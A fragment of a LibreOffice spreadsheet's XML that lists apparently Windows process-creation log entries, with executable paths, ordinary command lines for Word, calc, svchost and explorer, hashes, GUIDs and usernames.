            <text:p>"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n /prefetch:1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f3d35c529e01d22cd4a93d47c41d489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33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c2b545f-9a61-428b-ae80-c1c08904946f}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C:\Windows\System32\calc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alc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6487a48a-563d-45ca-9b7d-ff18f97baa86}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0xbe99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fc72ebe6edd0d37fd8a3194ce7b8215</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{5fad2b0e-ef14-4145-b685-00debd06fbec}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34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eb51d01d-476d-470f-8573-9d2042f91a86}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50f6242b96bde0dece75f2c0bca4d277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37:35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cf0e4191-b5ad-4dd0-a0f7-944c04a4e2ab}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3a7f46db-3090-42f0-b6a2-4ae597305d40}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0xad06a0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b1c6e08b8143349fff15c87e5f78d70</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{1688547c-fd83-44eb-a0db-c0e52f278a7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:\Windows\System32\winlogon.exe</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>winlogon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38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460ec982-2051-4986-88d9-30cdfa918e3e}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jdoe</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{e6e02e53-213e-4538-81a1-c28af4248c84}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0xeea29c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a5382d0916f218c96af32dacb69eea55</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{8a5c4491-5375-4eee-a2da-0edb692004c5}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39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8cb8d421-63fa-4c54-8410-8d564247f841}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="7564" calcext:value-type="float">
            <text:p>7564</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>C:\Windows\System32\backgroundTask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backgroundTaskHost.exe</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>"C:\Windows\System32\backgroundTaskHost.exe" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca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mwhite</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{3a7f46db-3090-42f0-b6a2-4ae597305d40}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0xad06a0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fb7b1936e1f9cb36fa6ea63c9d3c83f</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{8936e309-f08d-492f-803c-f9c2d3ac7bdb}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:\Windows\System32\svchost.exe</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>svchost.exe -k netsv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45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87f1514-db80-4ca2-bc91-695cad2094e7}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C:\Windows\System32\smartscreen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martscreen.exe</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>smartscreen.exe -embedding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6487a48a-563d-45ca-9b7d-ff18f97baa86}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0xbe99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0587fd05a79c04fdd3f86b33fbe86abe</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{5fad2b0e-ef14-4145-b685-00debd06fbec}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46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aaa9e7b3-5c5c-469e-b97e-4e4c2edb3979}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="8723" calcext:value-type="float">
            <text:p>8723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6487a48a-563d-45ca-9b7d-ff18f97baa86}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0xbe99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64ce8adc9cd27c12774a246a29f1e4d0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{5fad2b0e-ef14-4145-b685-00debd06fbec}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10-27 16:47:33.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1bee245-2c06-4bac-a63f-dc9a3128736f}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="7517" calcext:value-type="float">
            <text:p>7517</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>C:\Windows\System32\SearchProtocolHost.ex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earchProtocolHost.exe</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>"C:\Windows\System32\SearchProtocolHost.exe" Global\UsnsvcId:5634</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>C:\Windows\System32\</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>CORP\bsmith</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{6487a48a-563d-45ca-9b7d-ff18f97baa86}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0xbe99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D5=49d149085364fd54cd4e76887823bb2d</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{5fad2b0e-ef14-4145-b685-00debd06fbec}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:\Windows\explorer.exe</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>explorer.exe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..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8T16:06:15.630733274</dc:date>
    <meta:editing-duration>PT15M34S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="1" meta:cell-count="2609" meta:object-count="0"/>
    <meta:generator>LibreOffice/24.2.7.2$Linux_X86_64 LibreOffice_project/420$Build-2</meta:generator>
  </office:meta>
</office:document-meta>
</file>